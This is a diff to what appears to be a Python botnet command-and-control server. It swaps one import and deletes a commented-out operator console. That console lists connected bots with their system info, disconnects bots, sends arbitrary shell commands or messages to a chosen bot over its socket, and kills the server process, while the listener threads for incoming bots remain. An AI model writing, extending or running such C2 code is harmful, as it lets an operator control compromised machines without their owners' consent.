@@ -11,7 +11,7 @@ import socket, sys, os, requests, time, threading, random, datetime, subprocess
 from assets.cnc_controlpanel.main import *
 from assets.Config.main import *
 
-from assets.Commands.main import *
+from assets.Commands.main_screen import *
 from assets.Commands.command_handler import *
 
 
@@ -113,36 +113,3 @@ def bot_listen():
 threading.Thread(target=listener).start()
 threading.Thread(target=bot_listen).start()
 CP()
-# while(True):
-#         lol = input(cp_hostname)
-#         if lol == "help":
-#                 print(banner)
-#         elif "kick" in lol:
-#                 lawl()
-#                 h = int(lol.split(" ")[1])
-#                 bots[int(h)][0].close()
-#                 bots.pop(int(h))
-#         elif lol.startswith("sh"):
-#                 h = int(lol.split(" ")[1])
-#                 msg = lol.replace(str(h) + " ", "")
-#                 bots[int(h)][0].send(str(msg).encode())
-#                 print("cmd sent!")
-#         elif lol == "bots":
-#                 lawl()
-#                 i = 0
-#                 for u in bots:
-#                         print(f"Socket ID: {i}\r\n")
-#                         print(f"Socket: {u[0]}\r\n")
-#                         print(f"Socket SysInfo: {u[1]}\r\n")
-#                         print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
-#                         i += 1
-#         elif lol == "c":
-#                 os.system("clear")
-#         elif "msg" in lol:
-#                 gang = lol.split(" ")
-#                 msg = lol.replace(f"{gang[0]} {gang[1]}", "")
-#                 bots[int(gang[1])][0].send(str(msg).encode())
-#                 print("sent!")
-#         elif lol == "exit":
-#                 subprocess.getoutput("kill $(pgrep -fi bot_cnc.py)")
-        
